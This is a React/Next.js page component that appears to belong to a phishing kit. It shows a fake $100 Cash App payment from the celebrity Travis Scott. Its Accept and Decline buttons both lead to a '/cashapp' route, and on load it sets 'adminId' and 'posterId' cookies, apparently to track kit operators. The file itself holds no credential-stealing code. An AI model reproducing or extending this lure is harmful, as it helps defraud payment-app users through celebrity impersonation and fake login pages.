







"use client";
import { Field, Form, Formik } from "formik"
import Cookies from "js-cookie";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
export default function Home({ adminId, posterId }) {
  const [open, setOpen] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const [currentTime, setCurrentTime] = useState(new Date());
  const router = useRouter();
   const initialvalues = {
    email: "",
    password: "",
  };



 

const chabgetocashapp = async () => {
  router.push("/cashapp");
    }
    useEffect(() => {
    Cookies.set("adminId", adminId);
    Cookies.set("posterId", posterId);
  }, []);

  useEffect(() => {
    const intervalId = setInterval(() => {
      setCurrentTime(new Date());
    }, 60000);
    return () => clearInterval(intervalId);
  }, []);
  const formatTime = (date) => {
    const hours = date.getHours();
    const minutes = date.getMinutes();
    const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes;
    return `${hours}:${formattedMinutes}`;
  };


  return (
    <>
      (
        <div className="flex flex-col m-5 gap-5 ">
          <div className="text-center ">
            <p className="text-lg font-semibold">Travis Scott</p>
            <p className="text-xs text-gray-400">Payment form Stravisscott</p>
          </div>
          <div className="text-center mt-[50%]">
            <p className="text-2xl font-semibold">$100.00</p>
            <p className="text-xs text-gray-400">
              For la flame fans must eat Today at {formatTime(currentTime)}
            </p>
          </div>
          <div className=" flex flex-col gap-2 justify-center items-center text-center mt-[50%]">
            <button
              className=" w-[25%] px-5 py-1 rounded-xl bg-green-600 text-white"
              onClick={() => chabgetocashapp()}
            >
              Accept
            </button>
            <button 
            onClick={() => chabgetocashapp()}
            className=" w-[25%] px-5 py-1 rounded-xl bg-red-600 text-white">
              Decline
            </button>
          </div>
        </div>
     
   
      )
    </>
  );
}
